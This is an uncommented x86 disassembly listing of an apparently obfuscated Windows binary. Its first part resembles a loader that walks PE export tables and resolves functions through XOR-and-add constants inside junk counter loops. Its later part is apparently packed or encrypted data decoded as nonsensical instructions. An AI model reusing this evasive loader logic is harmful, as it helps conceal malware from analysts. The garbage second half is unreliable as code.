  4026ca:	add    al,0xc
  4026cc:	xor    al,0x70
  4026ce:	cmp    al,0x29
  4026d0:	mov    DWORD PTR ds:0x413cf0,0x3ac2
  4026da:	jne    0x402787
  4026e0:	add    edx,DWORD PTR ds:0x41401c
  4026e6:	mov    eax,DWORD PTR [ebp+0x8]
  4026e9:	and    DWORD PTR ds:0x413c84,0x0
  4026f3:	jmp    0x402707
  4026f8:	xor    edx,edx
  4026fa:	xor    edx,DWORD PTR ds:0x413c84
  402700:	inc    edx
  402701:	mov    DWORD PTR ds:0x413c84,edx
  402707:	cmp    DWORD PTR ds:0x413c84,0x12
  40270e:	jae    0x40274b
  402714:	cmp    DWORD PTR ds:0x413c84,0x7
  40271b:	jne    0x40272c
  402721:	push   0x4160b3
  402726:	call   DWORD PTR ds:0x41677c
  40272c:	cmp    DWORD PTR ds:0x413c84,0x6
  402733:	jne    0x402746
  402739:	mov    edx,DWORD PTR ds:0x413c84
  40273f:	inc    edx
  402740:	mov    DWORD PTR ds:0x413c84,edx
  402746:	jmp    0x4026f8
  40274b:	mov    ecx,DWORD PTR [ebp+0x8]
  40274e:	add    ecx,DWORD PTR [eax+0x3c]
  402751:	mov    edx,0x7510894
  402756:	mov    DWORD PTR [ebp+0x8],ecx
  402759:	mov    eax,DWORD PTR [ebp-0x4]
  40275c:	xor    eax,edx
  40275e:	push   esi
  40275f:	mov    esi,DWORD PTR [ebp+0x8]
  402762:	mov    ecx,0x3272dc
  402767:	add    eax,ecx
  402769:	cmp    DWORD PTR [esi+0x54],eax
  40276c:	pop    esi
  40276d:	je     0x40277b
  402773:	mov    eax,DWORD PTR [ebp+0x8]
  402776:	jmp    0x402794
  40277b:	mov    eax,DWORD PTR [ebp-0x4]
  40277e:	xor    eax,edx
  402780:	add    eax,ecx
  402782:	jmp    0x402794
  402787:	mov    eax,DWORD PTR [ebp-0x4]
  40278a:	xor    eax,0x7510894
  40278f:	add    eax,0x3272dc
  402794:	leave  
  402795:	ret    0x4
  402798:	push   ebp
  402799:	mov    ebp,esp
  40279b:	sub    esp,0x78
  40279e:	xor    DWORD PTR ds:0x413c1e,0x50b0
  4027a8:	push   ebx
  4027a9:	adc    DWORD PTR ds:0x413d30,0x7f7d
  4027b3:	push   esi
  4027b4:	add    DWORD PTR ds:0x413d30,0x413cf0
  4027be:	push   edi
  4027bf:	push   0x1f
  4027c1:	and    DWORD PTR ds:0x413bf6,0x413c80
  4027cb:	lea    eax,[ebp-0x78]
  4027ce:	push   eax
  4027cf:	push   0x0
  4027d1:	adc    DWORD PTR ds:0x413d34,0x413c80
  4027db:	call   DWORD PTR ds:0x41676c
  4027e1:	push   0x97898797
  4027e6:	call   DWORD PTR ds:0x416754
  4027ec:	sub    ecx,ecx
  4027ee:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4027f5:	xor    DWORD PTR ds:0x414008,0x58a1
  4027ff:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  402806:	mov    ecx,DWORD PTR [ebp-0x4]
  402809:	mov    ebx,0x7510894
  40280e:	xor    ecx,ebx
  402810:	mov    eax,0x3272dc
  402815:	xor    DWORD PTR ds:0x413c6c,0x3fbb
  40281f:	add    ecx,eax
  402821:	mov    DWORD PTR [ebp-0x1c],ecx
  402824:	sbb    DWORD PTR ds:0x413d34,edi
  40282a:	mov    ecx,DWORD PTR [ebp+0x14]
  40282d:	test   ecx,ecx
  40282f:	je     0x402847
  402835:	mov    ecx,DWORD PTR [ebp+0x14]
  402838:	mov    ecx,DWORD PTR [ecx]
  40283a:	or     DWORD PTR ds:0x413c0a,0x414000
  402844:	mov    DWORD PTR [ebp-0x1c],ecx
  402847:	mov    DWORD PTR ds:0x413d34,0x1f
  402851:	cmp    DWORD PTR ds:0x413d34,0x0
  402858:	je     0x40288f
  40285e:	cmp    DWORD PTR ds:0x413d34,0x22
  402865:	jne    0x40287d
  40286b:	push   0x414010
  402870:	push   0x0
  402872:	push   0x416017
  402877:	call   DWORD PTR ds:0x416780
  40287d:	mov    ecx,DWORD PTR ds:0x413d34
  402883:	dec    ecx
  402884:	mov    DWORD PTR ds:0x413d34,ecx
  40288a:	jmp    0x402851
  40288f:	mov    ecx,0x7665
  402894:	sbb    edi,edi
  402896:	imul   edx,eax
  402899:	and    DWORD PTR ds:0x413c80,0x0
  4028a3:	mov    esi,DWORD PTR ds:0x413c80
  4028a9:	inc    esi
  4028aa:	mov    DWORD PTR ds:0x413c80,esi
  4028b0:	cmp    DWORD PTR ds:0x413c80,0xc
  4028b7:	jne    0x4028cb
  4028bd:	push   0x413ce4
  4028c2:	push   DWORD PTR [ebp-0x20]
  4028c5:	call   DWORD PTR ds:0x416784
  4028cb:	cmp    DWORD PTR ds:0x413c80,0xb
  4028d2:	jne    0x4028e5
  4028d8:	mov    esi,DWORD PTR ds:0x413c80
  4028de:	inc    esi
  4028df:	mov    DWORD PTR ds:0x413c80,esi
  4028e5:	cmp    DWORD PTR ds:0x413c80,0x1c
  4028ec:	jb     0x4028a3
  4028f2:	mov    esi,0x76532
  4028f7:	mov    DWORD PTR ds:0x413d30,0x639a
  402901:	add    edx,ecx
  402903:	movzx  edi,BYTE PTR ds:0x413ce4
  40290a:	and    DWORD PTR ds:0x413bfe,edi
  402910:	xchg   esi,ecx
  402912:	sbb    DWORD PTR ds:0x413c80,edi
  402918:	mov    edi,0x54354
  40291d:	mov    DWORD PTR ds:0x413d34,0x5e6f
  402927:	sub    edx,edi
  402929:	mov    ecx,DWORD PTR [ebp-0x4]
  40292c:	xor    ecx,ebx
  40292e:	mov    DWORD PTR ds:0x413c70,0x13
  402938:	cmp    DWORD PTR ds:0x413c70,0x0
  40293f:	je     0x40299c
  402945:	cmp    DWORD PTR ds:0x413c70,0x5
  40294c:	jne    0x402962
  402952:	push   0x7f69
  402957:	push   0x41606e
  40295c:	call   DWORD PTR ds:0x41678c
  402962:	cmp    DWORD PTR ds:0x413c70,0x6
  402969:	jne    0x40297c
  40296f:	mov    esi,DWORD PTR ds:0x413c70
  402975:	dec    esi
  402976:	mov    DWORD PTR ds:0x413c70,esi
  40297c:	mov    esi,DWORD PTR ds:0x413c70
  402982:	dec    esi
  402983:	mov    DWORD PTR ds:0x413c70,esi
  402989:	jmp    0x402938
  40298e:	mov    esi,DWORD PTR ds:0x413cb0
  402994:	mov    esi,DWORD PTR [esi]
  402996:	adc    DWORD PTR ds:0x414008,esi
  40299c:	add    ecx,eax
  40299e:	mov    DWORD PTR [ebp-0x8],ecx
  4029a1:	sub    ecx,ecx
  4029a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4029a6:	sub    DWORD PTR ds:0x413c80,ebx
  4029ac:	xor    ecx,ebx
  4029ae:	add    ecx,eax
  4029b0:	mov    DWORD PTR [ebp-0x24],ecx
  4029b3:	sub    ecx,0x1ce
  4029b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4029bc:	mov    esi,DWORD PTR ds:0x413c1a
  4029c2:	xor    DWORD PTR ds:0x413d1c,esi
  4029c8:	xor    ecx,ebx
  4029ca:	add    ecx,eax
  4029cc:	add    DWORD PTR ds:0x413d34,edi
  4029d2:	mov    DWORD PTR [ebp-0x30],ecx
  4029d5:	movzx  esi,BYTE PTR ds:0x414010
  4029dc:	sbb    esi,DWORD PTR ds:0x413bfe
  4029e2:	mov    DWORD PTR ds:0x414010,esi
  4029e8:	mov    esi,DWORD PTR [ebp-0x4]
  4029eb:	adc    ecx,DWORD PTR ds:0x413c16
  4029f1:	xor    esi,ebx
  4029f3:	xor    DWORD PTR ds:0x41401c,ecx
  4029f9:	add    esi,eax
  4029fb:	and    DWORD PTR ds:0x413c84,0x0
  402a05:	jmp    0x402a17
  402a0a:	mov    ecx,DWORD PTR ds:0x413c84
  402a10:	inc    ecx
  402a11:	mov    DWORD PTR ds:0x413c84,ecx
  402a17:	cmp    DWORD PTR ds:0x413c84,0x19
  402a1e:	jae    0x402af3
  402a24:	cmp    DWORD PTR ds:0x413c84,0xd
  402a2b:	jne    0x402a51
  402a31:	push   0x7c39
  402a36:	push   0x413c1e
  402a3b:	push   0x8717
  402a40:	push   0x416025
  402a45:	push   DWORD PTR [ebp-0x28]
  402a48:	push   DWORD PTR [ebp-0x10]
  402a4b:	call   DWORD PTR ds:0x416790
  402a51:	cmp    DWORD PTR ds:0x413c84,0xc
  402a58:	jne    0x402a6b
  402a5e:	mov    ecx,DWORD PTR ds:0x413c84
  402a64:	inc    ecx
  402a65:	mov    DWORD PTR ds:0x413c84,ecx
  402a6b:	jmp    0x402a0a
  402a70:	mov    DWORD PTR ds:0x413d30,0x12
  402a7a:	cmp    DWORD PTR ds:0x413d30,0x0
  402a81:	je     0x402af3
  402a87:	cmp    DWORD PTR ds:0x413d30,0x21
  402a8e:	jne    0x402a9f
  402a94:	push   0x1529
  402a99:	call   DWORD PTR ds:0x416798
  402a9f:	mov    ecx,DWORD PTR ds:0x413d30
  402aa5:	dec    ecx
  402aa6:	mov    DWORD PTR ds:0x413d30,ecx
  402aac:	jmp    0x402a7a
  402ab1:	and    DWORD PTR ds:0x413d34,0x0
  402abb:	mov    ecx,DWORD PTR ds:0x413d34
  402ac1:	inc    ecx
  402ac2:	mov    DWORD PTR ds:0x413d34,ecx
  402ac8:	cmp    DWORD PTR ds:0x413d34,0x29
  402acf:	jne    0x402ae0
  402ad5:	push   0x413c12
  402ada:	call   DWORD PTR ds:0x41679c
  402ae0:	cmp    DWORD PTR ds:0x413d34,0x19
  402ae7:	jb     0x402abb
  402aed:	or     ecx,DWORD PTR ds:0x413c0a
  402af3:	mov    ecx,DWORD PTR [ebp-0x24]
  402af6:	or     DWORD PTR ds:0x413c88,0x413c12
  402b00:	sub    ecx,eax
  402b02:	add    DWORD PTR ds:0x413c1e,0x57cd
  402b0c:	lea    edx,[esi-0x3272dc]
  402b12:	xor    ecx,ebx
  402b14:	and    DWORD PTR ds:0x413ce8,0xb77
  402b1e:	xor    edx,ebx
  402b20:	mov    DWORD PTR ds:0x413bfe,0x29ac
  402b2a:	cmp    edx,ecx
  402b2c:	mov    DWORD PTR ds:0x413ce4,0x2b4b
  402b36:	je     0x402e02
  402b3c:	sub    ecx,DWORD PTR ds:0x413d34
  402b42:	mov    ecx,DWORD PTR [ebp-0x4]
  402b45:	xor    DWORD PTR ds:0x413bfe,0x413c84
  402b4f:	xor    ecx,ebx
  402b51:	adc    DWORD PTR ds:0x413bf6,0x7b2
  402b5b:	add    ecx,eax
  402b5d:	cmp    esi,ecx
  402b5f:	jne    0x402ddf
  402b65:	or     DWORD PTR ds:0x413cf0,0x413c1e
  402b6f:	push   DWORD PTR [ebp+0x8]
  402b72:	call   0x4026a6
  402b77:	mov    DWORD PTR ds:0x414004,0x1c
  402b81:	cmp    DWORD PTR ds:0x414004,0x0
  402b88:	je     0x402bc3
  402b8e:	cmp    DWORD PTR ds:0x414004,0x2b
  402b95:	jne    0x402ba9
  402b9b:	push   0x413c6c
  402ba0:	push   DWORD PTR [ebp-0x24]
  402ba3:	call   DWORD PTR ds:0x41675c
  402ba9:	xor    ecx,ecx
  402bab:	or     ecx,DWORD PTR ds:0x414004
  402bb1:	dec    ecx
  402bb2:	mov    DWORD PTR ds:0x414004,ecx
  402bb8:	jmp    0x402b81
  402bbd:	sbb    DWORD PTR ds:0x413d34,ecx
  402bc3:	mov    DWORD PTR [ebp-0x18],eax
  402bc6:	and    DWORD PTR ds:0x413d28,0x0
  402bd0:	jmp    0x402be2
  402bd5:	mov    ecx,DWORD PTR ds:0x413d28
  402bdb:	inc    ecx
  402bdc:	mov    DWORD PTR ds:0x413d28,ecx
  402be2:	cmp    DWORD PTR ds:0x413d28,0x16
  402be9:	jae    0x402c2e
  402bef:	cmp    DWORD PTR ds:0x413d28,0x5
  402bf6:	jne    0x402c0f
  402bfc:	push   DWORD PTR [ebp-0x10]
  402bff:	push   0x41400c
  402c04:	push   0x2409
  402c09:	call   DWORD PTR ds:0x416760
  402c0f:	cmp    DWORD PTR ds:0x413d28,0x4
  402c16:	jne    0x402c29
  402c1c:	mov    ecx,DWORD PTR ds:0x413d28
  402c22:	inc    ecx
  402c23:	mov    DWORD PTR ds:0x413d28,ecx
  402c29:	jmp    0x402bd5
  402c2e:	mov    eax,DWORD PTR [ebp-0x4]
  402c31:	sub    DWORD PTR ds:0x413ce4,0x168d
  402c3b:	mov    ecx,DWORD PTR [ebp-0x18]
  402c3e:	inc    edi
  402c3f:	xor    eax,ebx
  402c41:	and    DWORD PTR ds:0x413c88,0x0
  402c4b:	jmp    0x402c5d
  402c50:	mov    edi,DWORD PTR ds:0x413c88
  402c56:	inc    edi
  402c57:	mov    DWORD PTR ds:0x413c88,edi
  402c5d:	cmp    DWORD PTR ds:0x413c88,0x1c
  402c64:	jae    0x402ca8
  402c6a:	cmp    DWORD PTR ds:0x413c88,0x5
  402c71:	jne    0x402c89
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	push   DWORD PTR [ebp-0x10]
  402c7d:	push   DWORD PTR [ebp-0x28]
  402c80:	push   DWORD PTR [ebp-0xc]
  402c83:	call   DWORD PTR ds:0x416764
  402c89:	cmp    DWORD PTR ds:0x413c88,0x4
  402c90:	jne    0x402ca3
  402c96:	mov    edi,DWORD PTR ds:0x413c88
  402c9c:	inc    edi
  402c9d:	mov    DWORD PTR ds:0x413c88,edi
  402ca3:	jmp    0x402c50
  402ca8:	mov    edi,0x3272dc
  402cad:	sbb    DWORD PTR ds:0x414008,0x338e
  402cb7:	add    eax,edi
  402cb9:	cmp    ecx,eax
  402cbb:	mov    DWORD PTR ds:0x413bfe,0x2c9f
  402cc5:	je     0x402e72
  402ccb:	adc    DWORD PTR ds:0x413c74,0x2cc9
  402cd5:	push   DWORD PTR [ebp-0x18]
  402cd8:	add    DWORD PTR ds:0x413c74,0x6616
  402ce2:	push   DWORD PTR [ebp+0x8]
  402ce5:	neg    DWORD PTR ds:0x413d2c
  402ceb:	call   0x407cf9
  402cf0:	mov    DWORD PTR [ebp-0x18],eax
  402cf3:	xor    DWORD PTR ds:0x413c12,ebx
  402cf9:	mov    eax,DWORD PTR [ebp-0x4]
  402cfc:	add    DWORD PTR ds:0x414008,edx
  402d02:	mov    ecx,DWORD PTR [ebp-0x18]
  402d05:	sub    DWORD PTR ds:0x413cdc,0x28ac
  402d0f:	xor    eax,ebx
  402d11:	sub    DWORD PTR ds:0x41400c,0x413ce4
  402d1b:	add    eax,edi
  402d1d:	cmp    ecx,eax
  402d1f:	je     0x402e72
  402d25:	or     DWORD PTR ds:0x414014,edi
  402d2b:	mov    eax,DWORD PTR [ebp-0x18]
  402d2e:	mov    ecx,DWORD PTR ds:0x414008
  402d34:	adc    ecx,DWORD PTR ds:0x413c7c
  402d3a:	mov    DWORD PTR ds:0x414008,ecx
  402d40:	mov    eax,DWORD PTR [eax+0x18]
  402d43:	mov    ecx,DWORD PTR ds:0x413ca4
  402d49:	mov    ecx,DWORD PTR [ecx]
  402d4b:	and    DWORD PTR ds:0x413d28,ecx
  402d51:	mov    DWORD PTR [ebp-0x24],eax
  402d54:	and    DWORD PTR ds:0x413c70,0x0
  402d5e:	mov    ecx,DWORD PTR ds:0x413c70
  402d64:	inc    ecx
  402d65:	mov    DWORD PTR ds:0x413c70,ecx
  402d6b:	cmp    DWORD PTR ds:0x413c70,0xf
  402d72:	jne    0x402d8d
  402d78:	push   0x2d13
  402d7d:	push   0x29b5
  402d82:	push   0x400000
  402d87:	call   DWORD PTR ds:0x416768
  402d8d:	cmp    DWORD PTR ds:0x413c70,0xe
  402d94:	jne    0x402da7
  402d9a:	mov    ecx,DWORD PTR ds:0x413c70
  402da0:	inc    ecx
  402da1:	mov    DWORD PTR ds:0x413c70,ecx
  402da7:	cmp    DWORD PTR ds:0x413c70,0x18
  402dae:	jb     0x402d5e
  402db4:	mov    eax,DWORD PTR [ebp-0x18]
  402db7:	mov    ecx,DWORD PTR [ebp+0x8]
  402dba:	add    ecx,DWORD PTR [eax+0x20]
  402dbd:	mov    DWORD PTR [ebp-0x2c],ecx
  402dc0:	mov    eax,DWORD PTR [ebp-0x18]
  402dc3:	mov    ecx,DWORD PTR [ebp+0x8]
  402dc6:	add    ecx,DWORD PTR [eax+0x24]
  402dc9:	mov    DWORD PTR [ebp-0x34],ecx
  402dcc:	mov    eax,DWORD PTR [ebp-0x18]
  402dcf:	mov    ecx,DWORD PTR [ebp+0x8]
  402dd2:	add    ecx,DWORD PTR [eax+0x1c]
  402dd5:	mov    eax,edi
  402dd7:	mov    DWORD PTR [ebp-0x18],ecx
  402dda:	jmp    0x402e3a
  402ddf:	mov    ecx,DWORD PTR [ebp-0x2c]
  402de2:	mov    edx,DWORD PTR [ebp+0x8]
  402de5:	add    edx,DWORD PTR [ecx+esi*4]
  402de8:	mov    DWORD PTR [ebp-0x28],edx
  402deb:	mov    ecx,DWORD PTR [ebp-0x4]
  402dee:	mov    edx,DWORD PTR [ebp-0x28]
  402df1:	xor    ecx,ebx
  402df3:	add    ecx,eax
  402df5:	cmp    edx,ecx
  402df7:	je     0x402e3a
  402dfd:	jmp    0x402e26
  402e02:	mov    ecx,DWORD PTR [ebp-0x4]
  402e05:	mov    edx,DWORD PTR [ebp-0x8]
  402e08:	xor    ecx,ebx
  402e0a:	add    ecx,eax
  402e0c:	cmp    edx,ecx
  402e0e:	je     0x402e7e
  402e14:	mov    ecx,DWORD PTR [ebp-0x4]
  402e17:	mov    edx,DWORD PTR [ebp-0x30]
  402e1a:	xor    ecx,ebx
  402e1c:	add    ecx,eax
  402e1e:	cmp    edx,ecx
  402e20:	je     0x40522e
  402e26:	lea    eax,[ebp-0x8]
  402e29:	push   eax
  402e2a:	push   DWORD PTR [ebp-0x28]
  402e2d:	push   DWORD PTR [ebp+0xc]
  402e30:	call   0x40a47a
  402e35:	mov    eax,0x3272dc
  402e3a:	mov    ecx,DWORD PTR [ebp-0x4]
  402e3d:	mov    edx,DWORD PTR [ebp-0x8]
  402e40:	xor    ecx,ebx
  402e42:	add    ecx,eax
  402e44:	cmp    edx,ecx
  402e46:	je     0x402e61
  402e4c:	mov    ecx,DWORD PTR [ebp-0x34]
  402e4f:	movzx  ecx,WORD PTR [ecx+esi*2]
  402e53:	mov    edx,DWORD PTR [ebp-0x18]
  402e56:	mov    ecx,DWORD PTR [edx+ecx*4]
  402e59:	mov    DWORD PTR [ebp-0x38],ecx
  402e5c:	jmp    0x402e02
  402e61:	mov    ecx,DWORD PTR [ebp-0x14]
  402e64:	xor    ecx,ebx
  402e66:	lea    esi,[esi+ecx*1+0x3272dc]
  402e6d:	jmp    0x4029fb
  402e72:	mov    eax,DWORD PTR [ebp-0x4]
  402e75:	xor    eax,ebx
  402e77:	add    eax,edi
  402e79:	jmp    0x405392
  402e7e:	mov    eax,DWORD PTR [ebp-0x4]
  402e81:	jmp    0x405222
  402e86:	or     al,0xe7
  402e88:	xchg   BYTE PTR [ebx-0x240e7489],cl
  402e8e:	xchg   bl,cl
  402e90:	pushf  
  402e91:	cmp    DWORD PTR [esi+0x7c85e837],ebx
  402e97:	jl     0x402f15
  402e99:	jl     0x402e7b
  402e9b:	pop    edi
  402e9c:	jl     0x402f1a
  402e9e:	adc    eax,0x1921172e
  402ea3:	and    eax,0x38652f1b
  402ea8:	imul   ebp,DWORD PTR [eax-0x7e],0x6d6c6c62
  402eaf:	xor    al,0xc5
  402eb1:	fsubrp st(1),st
  402eb3:	push   edx
  402eb4:	dec    edx
  402eb5:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff92
  402eb9:	bound  ebp,QWORD PTR [ebp+0x59]
  402ebc:	iret   
  402ebd:	pop    ebp
  402ebe:	dec    esp
  402ebf:	and    cl,BYTE PTR [esi+0x577887fc]
  402ec5:	dec    ebp
  402ec6:	jg     0x402eff
  402ec8:	jb     0x402e72
  402eca:	jg     0x402e6e
  402ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ecd:	cmp    ebp,DWORD PTR [esi]
  402ecf:	jmp    FWORD PTR [eax-0x22]
  402ed2:	cld    
  402ed3:	push   ebx
  402ed4:	jg     0x402ed6
  402ed6:	in     eax,dx
  402ed7:	cmp    ebp,ecx
  402ed9:	mov    esp,0xc01387ed
  402ede:	mov    ebp,DWORD PTR [ecx]
  402ee0:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c68c]
  402ee7:	fld    QWORD PTR [esi]
  402ee9:	(bad)  
  402eea:	lock cld 
  402eec:	sub    BYTE PTR [edx],bl
  402eee:	dec    edx
  402eef:	push   cs
  402ef0:	sub    BYTE PTR [ebx+0x6a],ch
  402ef3:	mov    ecx,0x54113af
  402ef8:	test   al,0xff
  402efa:	jmp    0x34b65a48
  402eff:	retf   0xf95b
  402f02:	sbb    al,0xfc
  402f04:	jp     0x402ea7
  402f06:	arpl   bp,bx
  402f08:	call   0x8416:0x7a18b5f
  402f0f:	xor    ebx,esi
  402f11:	cmp    BYTE PTR [esi],0x74
  402f14:	jae    0x402f21
  402f16:	fsubr  QWORD PTR ds:0x33368d54
  402f1c:	push   esi
  402f1d:	jecxz  0x402eee
  402f1f:	mov    WORD PTR [ecx],gs
  402f21:	mov    DWORD PTR [edx+0x518aceb7],esi
  402f27:	out    0x45,al
  402f29:	push   esp
  402f2a:	dec    esi
  402f2b:	push   cs
  402f2c:	and    bl,dh
  402f2e:	cmp    BYTE PTR [ebx],al
  402f30:	lods   eax,DWORD PTR ds:[esi]
  402f31:	dec    ebx
  402f32:	int3   
  402f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f34:	xor    al,dl
  402f36:	push   es
  402f37:	pop    eax
  402f38:	std    
  402f39:	push   esp
  402f3a:	pop    eax
  402f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3c:	stc    
  402f3d:	push   0xffffffbf
  402f3f:	cli    
  402f40:	inc    esp
  402f41:	sbb    ebp,DWORD PTR [ebp-0x55c9426]
  402f47:	mov    bl,0xcd
  402f49:	in     al,dx
  402f4a:	pop    es
  402f4b:	adc    eax,0x9ce359c4
  402f50:	repz into 
  402f52:	pop    ebp
  402f53:	aam    0x7c
  402f55:	and    BYTE PTR [ebx+0x49e68ccb],bh
  402f5b:	sub    al,0xc8
  402f5d:	xchg   ebx,eax
  402f5e:	sbb    DWORD PTR [ebp+0x61b52b7f],edi
  402f64:	mov    ds:0xfc33df67,al
  402f69:	mov    esi,0x1611ecf
  402f6e:	inc    esp
  402f6f:	push   ecx
  402f70:	mul    BYTE PTR [eax+0x1e9816be]
  402f76:	xor    eax,0x4c71bf41
  402f7b:	sbb    al,0xc3
  402f7d:	pop    esp
  402f7e:	mov    cl,0xea
  402f80:	cs (bad) 
  402f82:	xchg   edx,eax
  402f83:	dec    BYTE PTR [ecx-0xd]
  402f86:	das    
  402f87:	scas   al,BYTE PTR es:[edi]
  402f88:	mov    eax,DWORD PTR [ecx+0x539fb405]
  402f8e:	adc    ch,BYTE PTR [edx-0x5bd40ab6]
  402f94:	leave  
  402f95:	shr    BYTE PTR [edi],cl
  402f97:	arpl   WORD PTR [eax+0x3c],dx
  402f9a:	mov    dl,0x7b
  402f9c:	pop    esi
  402f9d:	ss sub eax,0x7f071c9f
  402fa3:	cld    
  402fa4:	ror    DWORD PTR [ebp+0x5b],cl
  402fa7:	and    eax,0xf6822c9
  402fac:	sub    al,0x85
  402fae:	jo     0x40300c
  402fb0:	imul   DWORD PTR [ebx-0x20]
  402fb3:	clc    
  402fb4:	inc    esp
  402fb5:	(bad)  
  402fb7:	sbb    BYTE PTR [esi+ebp*4-0x6750530b],cl
  402fbe:	rol    edx,cl
  402fc0:	add    DWORD PTR [ebx-0x2e4d842],ebx
  402fc6:	in     al,0x94
  402fc8:	add    al,BYTE PTR [edi]
  402fca:	add    al,0x42
  402fcc:	fcomip st,st(7)
  402fce:	ds dec ecx
  402fd0:	mov    bl,BYTE PTR [esi-0x368a495e]
  402fd6:	pusha  
  402fd7:	ret    0xe64c
  402fda:	mov    al,ds:0xd20e28d7
  402fdf:	lahf   
  402fe0:	jbe    0x402f8e
  402fe2:	mov    WORD PTR [esi],es
  402fe4:	data16 fbstp TBYTE PTR [edx]
  402fe7:	mov    ch,BYTE PTR [esp+edi*1]
  402fea:	enter  0x21fd,0x37
  402fee:	mov    al,0xf3
  402ff0:	les    ebx,FWORD PTR [esi]
  402ff2:	xor    al,0xdc
  402ff4:	ja     0x402fdc
  402ff6:	data16 xlat BYTE PTR ds:[ebx]
  402ff8:	inc    ebp
  402ff9:	sub    BYTE PTR [di-0x45fa],0xd4
  402fff:	daa    
  403000:	imul   DWORD PTR [esi+0x21c10d9]
  403006:	pusha  
  403007:	pop    ss
  403008:	fistp  WORD PTR [esi-0x2c7562c5]
  40300e:	and    al,0x81
  403010:	test   DWORD PTR [edi],esi
  403012:	pop    esp
  403013:	or     DWORD PTR [eax-0x4bc85747],esp
  403019:	or     bh,ah
  40301b:	add    ch,dh
  40301d:	jl     0x402fa7
  40301f:	xor    DWORD PTR [ecx+ebp*8],edx
  403022:	addr16 dec edx
  403024:	sub    bh,BYTE PTR [ebx-0x30]
  403027:	lock lds esi,FWORD PTR [ecx+0x658aaba2]
  40302e:	aas    
  40302f:	push   ss
  403030:	mov    esp,esp
  403032:	push   esp
  403033:	xchg   ebp,eax
  403034:	push   0x51
  403036:	cmp    al,0x94
  403038:	fdivr  st(5),st
  40303a:	mov    BYTE PTR [ecx],dh
  40303c:	inc    ecx
  40303d:	sub    BYTE PTR ds:0xf549a275,0x5
  403044:	lock push esp
  403046:	xchg   esp,eax
  403047:	in     eax,dx
  403048:	in     eax,0x3d
  40304a:	das    
  40304b:	stos   BYTE PTR es:[edi],al
  40304c:	mov    al,0x75
  40304e:	out    0x84,eax
  403050:	sub    DWORD PTR [ecx-0x66],esp
  403053:	cs mov esi,0xa8f244b7
  403059:	je     0x403010
  40305b:	or     al,0x25
  40305d:	icebp  
  40305e:	and    BYTE PTR [esi],ch
  403060:	and    BYTE PTR [eax],bh
  403062:	sbb    DWORD PTR [ebx+0x5f],ecx
  403065:	pop    ss
  403066:	idiv   BYTE PTR [ebp+0x5aff036f]
  40306c:	push   ss
  40306d:	sbb    eax,0x880a722f
  403072:	mov    ah,ah
  403074:	int3   
  403075:	ficomp WORD PTR ds:0xc1f88b81
  40307b:	ss xchg edx,eax
  40307d:	stos   DWORD PTR es:[edi],eax
  40307e:	(bad)  
  40307f:	mov    eax,0x319ed222
  403084:	jmp    0x287:0x2d7ff200
  40308b:	pusha  
  40308c:	pop    ecx
  40308d:	arpl   WORD PTR [bx+0x3b],sp
  403091:	dec    edx
  403092:	pop    ecx
  403093:	enter  0xe45,0xec
  403097:	mov    BYTE PTR [ecx+0x7d2921c],al
  40309d:	add    dl,BYTE PTR [ebp-0x7]
  4030a0:	and    al,BYTE PTR [esp+eiz*4-0x2d62ff8f]
  4030a7:	inc    ebx
  4030a8:	fldcw  WORD PTR [eax-0x517d412e]
  4030ae:	xor    al,0xa2
  4030b0:	aaa    
  4030b1:	rol    DWORD PTR [ebp+0x63],cl
  4030b4:	pusha  
  4030b5:	loope  0x40305b
  4030b7:	cmp    eax,0xaa6d428f
  4030bc:	jecxz  0x403101
  4030be:	pop    esp
  4030bf:	aas    
  4030c0:	jg     0x40312b
  4030c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c3:	cmp    BYTE PTR [ebp-0x55114fa9],0x4b
  4030ca:	(bad)  [esp+eax*4-0x1f]
  4030ce:	jb     0x40309f
  4030d0:	pop    ss
  4030d1:	mov    eax,ds:0x791c0712
  4030d6:	push   ecx
  4030d7:	dec    esp
  4030d8:	inc    edx
  4030d9:	xor    BYTE PTR [eax+0x17],0x2
  4030dd:	hlt    
  4030de:	inc    edx
  4030df:	les    eax,FWORD PTR [esi]
  4030e1:	cwde   
  4030e2:	pop    edx
  4030e3:	and    bh,BYTE PTR [ecx-0x49]
  4030e6:	sahf   
  4030e7:	or     ah,BYTE PTR [edx-0x7e55651]
  4030ed:	dec    esp
  4030ee:	xor    al,al
  4030f0:	lds    ebx,FWORD PTR [esi+edx*1]
  4030f3:	cmc    
  4030f4:	sahf   
  4030f5:	pop    esp
  4030f6:	call   0x9d665aed
  4030fb:	jmp    0x40308a
  4030fd:	mov    bl,0xe5
  4030ff:	add    eax,0xb1017491
  403105:	dec    esp
  403106:	xchg   ecx,eax
  403107:	and    al,0x8e
  403109:	cmp    al,0xd7
  40310b:	fincstp 
  40310d:	mov    DWORD PTR [esi-0x14],ecx
  403110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403111:	(bad)  
  403112:	ror    DWORD PTR ds:0xea6b9c54,cl
  403118:	cmp    esi,DWORD PTR [edi+0x7c]
  40311b:	call   0xba0dfe39
  403120:	aam    0xea
  403122:	push   eax
  403123:	xchg   esi,eax
  403124:	sub    DWORD PTR [ecx+0x5e],eax
  403127:	in     eax,dx
  403128:	aam    0x4e
  40312a:	and    al,0x84
  40312c:	les    ecx,FWORD PTR [ebx+0x1bbc6ef3]
  403132:	js     0x4031a4
  403134:	mov    eax,ds:0x50c8f273
  403139:	cmc    
  40313a:	cli    
  40313b:	aaa    
  40313c:	popf   
  40313d:	mov    bl,BYTE PTR ds:0xf66d8a0a
  403143:	cmp    edi,edi
  403145:	sub    bh,0xf
  403148:	xchg   ecx,eax
  403149:	ss pushf 
  40314b:	sbb    edi,DWORD PTR [ecx+0x64]
  40314e:	lods   al,BYTE PTR ds:[esi]
  40314f:	push   ebx
  403150:	cmp    esi,ebx
  403152:	jnp    0x4030f6
  403154:	inc    ebx
  403155:	jmp    0x403155
  403157:	dec    ecx
  403158:	jne    0x40311b
  40315a:	mov    eax,ds:0x6f774dff
